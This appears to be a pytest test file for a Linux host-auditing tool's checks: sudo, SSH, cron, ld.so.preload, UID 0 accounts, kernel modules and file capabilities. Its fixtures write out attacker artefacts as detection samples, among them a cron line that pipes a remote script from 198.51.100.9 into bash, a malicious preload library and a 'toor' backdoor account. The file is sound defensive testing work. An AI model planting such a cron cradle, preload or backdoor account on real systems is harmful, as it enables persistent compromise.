"""Tests for configuration audit checks."""

from datetime import datetime, timezone
from pathlib import Path

from traxerax_lite.config import AuditSettings
from traxerax_lite.audit_checks import run_audit_checks


def test_passwordless_sudo_check(tmp_path):
    """The passwordless sudo check should flag NOPASSWD rules."""
    sudoers = tmp_path / "sudoers"
    sudoers.write_text("alice ALL=(ALL) NOPASSWD: ALL\n")

    settings = AuditSettings(
        enabled_checks={"passwordless_sudo"},
        check_severities={"passwordless_sudo": "high"},
        sudoers_paths=(str(sudoers),),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert len(findings) == 1
    assert findings[0].check_id == "passwordless_sudo"
    assert findings[0].severity == "high"
    assert "NOPASSWD" in findings[0].resource


def test_ssh_hardening_check_flags_root_login(tmp_path):
    """The SSH hardening check should flag PermitRootLogin yes."""
    sshd_config = tmp_path / "sshd_config"
    sshd_config.write_text("PermitRootLogin yes\nPasswordAuthentication no\n")

    settings = AuditSettings(
        enabled_checks={"ssh_hardening"},
        check_severities={"ssh_hardening": "high"},
        sshd_config_path=str(sshd_config),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert len(findings) == 1
    assert findings[0].check_id == "ssh_hardening"
    assert "root login" in findings[0].message.lower()


def test_writable_path_directories_check(tmp_path):
    """The writable PATH directories check should flag world-writable dirs."""
    import os

    bad_dir = tmp_path / "badbin"
    bad_dir.mkdir()
    bad_dir.chmod(0o777)

    original_path = os.environ.get("PATH", "")
    os.environ["PATH"] = str(bad_dir)
    try:
        settings = AuditSettings(enabled_checks={"writable_path_directories"})
        findings = run_audit_checks(
            settings, "run-1", datetime.now(timezone.utc)
        )
        assert any(
            finding.check_id == "writable_path_directories"
            and str(bad_dir) in finding.resource
            for finding in findings
        )
    finally:
        os.environ["PATH"] = original_path


def test_empty_password_accounts_check(tmp_path):
    """The empty password check should flag accounts with empty password fields."""
    shadow = tmp_path / "shadow"
    shadow.write_text("alice::0:0:99999:7:::\nbob:$6$...:0:0:99999:7:::\n")

    settings = AuditSettings(
        enabled_checks={"empty_password_accounts"},
        shadow_path=str(shadow),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert len(findings) == 1
    assert findings[0].resource == "alice"


def test_suspicious_cron_entries_check_flags_patterns(tmp_path):
    """The suspicious cron check should flag download/cradle patterns."""
    cron_file = tmp_path / "crontab"
    cron_file.write_text(
        "* * * * * root curl http://198.51.100.9/p.sh | bash\n"
    )

    settings = AuditSettings(
        enabled_checks={"suspicious_cron_entries"},
        cron_paths=(str(cron_file),),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert len(findings) == 1
    assert findings[0].check_id == "suspicious_cron_entries"
    assert "curl" in findings[0].message


def test_suspicious_cron_entries_check_ignores_clean_entries(tmp_path):
    """The suspicious cron check should not fire on ordinary entries."""
    cron_file = tmp_path / "crontab"
    cron_file.write_text(
        "# a comment mentioning curl is skipped\n"
        "0 5 * * * root /usr/bin/logrotate /etc/logrotate.conf\n"
    )

    settings = AuditSettings(
        enabled_checks={"suspicious_cron_entries"},
        cron_paths=(str(cron_file),),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert findings == []


def test_ld_preload_injection_flags_non_empty_file(tmp_path):
    """The ld.so.preload check should flag a non-empty preload file."""
    preload = tmp_path / "ld.so.preload"
    preload.write_text("/usr/lib/evil.so\n")

    settings = AuditSettings(
        enabled_checks={"ld_preload_injection"},
        ld_preload_path=str(preload),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert len(findings) == 1
    assert findings[0].check_id == "ld_preload_injection"
    assert findings[0].severity == "critical"


def test_ld_preload_injection_ignores_missing_or_empty_file(tmp_path):
    """The ld.so.preload check should stay clean without preload content."""
    missing = tmp_path / "ld.so.preload"
    settings = AuditSettings(
        enabled_checks={"ld_preload_injection"},
        ld_preload_path=str(missing),
    )
    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert findings == []

    missing.write_text("  \n\t\n")
    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert findings == []


def test_uid_zero_accounts_flags_non_root_uid_zero(tmp_path):
    """The UID 0 check should flag non-root accounts with UID 0."""
    passwd = tmp_path / "passwd"
    passwd.write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "toor:x:0:0:backdoor:/root:/bin/bash\n"
        "alice:x:1000:1000:alice:/home/alice:/bin/bash\n"
    )

    settings = AuditSettings(
        enabled_checks={"uid_zero_accounts"},
        passwd_path=str(passwd),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert len(findings) == 1
    assert findings[0].check_id == "uid_zero_accounts"
    assert findings[0].severity == "high"
    assert findings[0].resource == "toor"


def test_uid_zero_accounts_ignores_root_only(tmp_path):
    """The UID 0 check should not fire when only root has UID 0."""
    passwd = tmp_path / "passwd"
    passwd.write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
    )

    settings = AuditSettings(
        enabled_checks={"uid_zero_accounts"},
        passwd_path=str(passwd),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert findings == []


def test_kernel_tainted_flags_nonzero_value(tmp_path):
    """The kernel taint check should report a nonzero taint value."""
    tainted = tmp_path / "tainted"
    tainted.write_text("512\n")

    settings = AuditSettings(
        enabled_checks={"kernel_tainted"},
        kernel_tainted_path=str(tainted),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert len(findings) == 1
    assert findings[0].check_id == "kernel_tainted"
    assert findings[0].severity == "low"
    assert "512" in findings[0].message


def test_kernel_tainted_ignores_zero_or_missing(tmp_path):
    """The kernel taint check should stay clean on zero or missing files."""
    tainted = tmp_path / "tainted"
    settings = AuditSettings(
        enabled_checks={"kernel_tainted"},
        kernel_tainted_path=str(tainted),
    )
    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert findings == []

    tainted.write_text("0\n")
    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert findings == []


def test_hidden_kernel_module_flags_sysfs_only_module(tmp_path):
    """The hidden module check should flag loaded modules missing from /proc."""
    sys_module = tmp_path / "sys_module"
    hidden = sys_module / "evilmod"
    (hidden / "sections").mkdir(parents=True)
    visible = sys_module / "normalmod"
    (visible / "sections").mkdir(parents=True)
    builtin = sys_module / "builtinmod"
    builtin.mkdir()

    proc_modules = tmp_path / "proc_modules"
    proc_modules.write_text("normalmod 16384 0 - Live 0xffffffffc0000000\n")

    settings = AuditSettings(
        enabled_checks={"hidden_kernel_module"},
        sys_module_path=str(sys_module),
        proc_modules_path=str(proc_modules),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert len(findings) == 1
    assert findings[0].check_id == "hidden_kernel_module"
    assert findings[0].severity == "high"
    assert findings[0].resource == "evilmod"


def test_hidden_kernel_module_ignores_builtin_entries(tmp_path):
    """Builtin-only /sys/module entries (no sections/) should not be flagged."""
    sys_module = tmp_path / "sys_module"
    (sys_module / "builtinmod").mkdir(parents=True)

    proc_modules = tmp_path / "proc_modules"
    proc_modules.write_text("")

    settings = AuditSettings(
        enabled_checks={"hidden_kernel_module"},
        sys_module_path=str(sys_module),
        proc_modules_path=str(proc_modules),
    )

    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert findings == []


def _cap_xattr(permitted_lo=0, permitted_hi=0, effective=True):
    """Build a v3 (VFS_CAP_U32=2) security.capability xattr byte string.

    Layout: magic_etc (revision 3 in the high byte + effective flag), then
    lo/hi (permitted, inheritable) u32 pairs, then the v3 rootid u32.
    """
    import struct

    magic_etc = 0x03000000 | (0x1 if effective else 0)
    return struct.pack(
        "<IIIIII", magic_etc, permitted_lo, 0, permitted_hi, 0, 0
    )


def _patch_getxattr(monkeypatch, caps_by_path):
    """Fake os.getxattr: security.* xattrs need CAP_SETFCAP to set for real,
    so tests patch the reader instead of calling os.setxattr."""
    import os

    def fake_getxattr(path, name, *args, **kwargs):
        if name == "security.capability" and str(path) in caps_by_path:
            return caps_by_path[str(path)]
        raise OSError(95, "Operation not supported")

    monkeypatch.setattr(os, "getxattr", fake_getxattr)


def test_decode_capability_xattr_v3_layout():
    """The decoder should read permitted lo/hi words and the effective flag."""
    from traxerax_lite.audit_checks import _decode_capability_xattr

    # magic_etc = 0x03000001 (v3 + effective), permitted_lo = 1 << 7
    # (cap_setuid), permitted_hi = 1 << 7 (bit 39 = cap_bpf).
    raw = _cap_xattr(permitted_lo=0x80, permitted_hi=0x80, effective=True)
    permitted, effective = _decode_capability_xattr(raw)

    assert effective is True
    assert permitted & (1 << 7)  # cap_setuid, lo word
    assert permitted & (1 << 39)  # cap_bpf, hi word
    assert not permitted & (1 << 13)  # cap_net_raw not set

    # Truncated values are not decodable.
    assert _decode_capability_xattr(b"\x00" * 8) is None


def test_file_capabilities_flags_dangerous_cap(tmp_path, monkeypatch):
    """A binary with cap_setuid should produce a high-severity finding."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    target = bindir / "backdoored"
    target.write_bytes(b"\x7fELF fake")

    _patch_getxattr(monkeypatch, {str(target): _cap_xattr(permitted_lo=0x80)})

    settings = AuditSettings(
        enabled_checks={"file_capabilities"},
        suid_search_paths=(str(bindir),),
    )
    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))

    assert len(findings) == 1
    assert findings[0].check_id == "file_capabilities"
    assert findings[0].severity == "high"
    assert "cap_setuid" in findings[0].message
    assert findings[0].resource == str(target)
    assert findings[0].data["effective"] is True


def test_file_capabilities_benign_cap_is_low(tmp_path, monkeypatch):
    """A benign-only grant like cap_net_raw should be low severity."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    target = bindir / "ping"
    target.write_bytes(b"\x7fELF fake")

    # cap_net_raw is bit 13.
    _patch_getxattr(
        monkeypatch, {str(target): _cap_xattr(permitted_lo=1 << 13)}
    )

    settings = AuditSettings(
        enabled_checks={"file_capabilities"},
        suid_search_paths=(str(bindir),),
    )
    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))

    assert len(findings) == 1
    assert findings[0].check_id == "file_capabilities"
    assert findings[0].severity == "low"
    assert findings[0].data["dangerous_caps"] == []


def test_file_capabilities_hi_word_dangerous_cap(tmp_path, monkeypatch):
    """Dangerous capabilities in the hi 32-bit word (bit >= 32) are flagged."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    target = bindir / "bpfloader"
    target.write_bytes(b"\x7fELF fake")

    # cap_bpf is bit 39 -> bit 7 of the hi word.
    _patch_getxattr(
        monkeypatch, {str(target): _cap_xattr(permitted_hi=1 << 7)}
    )

    settings = AuditSettings(
        enabled_checks={"file_capabilities"},
        suid_search_paths=(str(bindir),),
    )
    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))

    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert "cap_bpf" in findings[0].data["dangerous_caps"]


def test_file_capabilities_no_xattr_no_finding(tmp_path, monkeypatch):
    """Files without a security.capability xattr produce no finding."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    target = bindir / "plain"
    target.write_bytes(b"\x7fELF fake")

    _patch_getxattr(monkeypatch, {})

    settings = AuditSettings(
        enabled_checks={"file_capabilities"},
        suid_search_paths=(str(bindir),),
    )
    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert findings == []


def test_file_capabilities_allowlisted_path_suppressed(tmp_path, monkeypatch):
    """Paths in allowed_capability_files produce no finding."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    target = bindir / "ping"
    target.write_bytes(b"\x7fELF fake")

    _patch_getxattr(monkeypatch, {str(target): _cap_xattr(permitted_lo=0x80)})

    settings = AuditSettings(
        enabled_checks={"file_capabilities"},
        suid_search_paths=(str(bindir),),
        allowed_capability_files=(str(target),),
    )
    findings = run_audit_checks(settings, "run-1", datetime.now(timezone.utc))
    assert findings == []
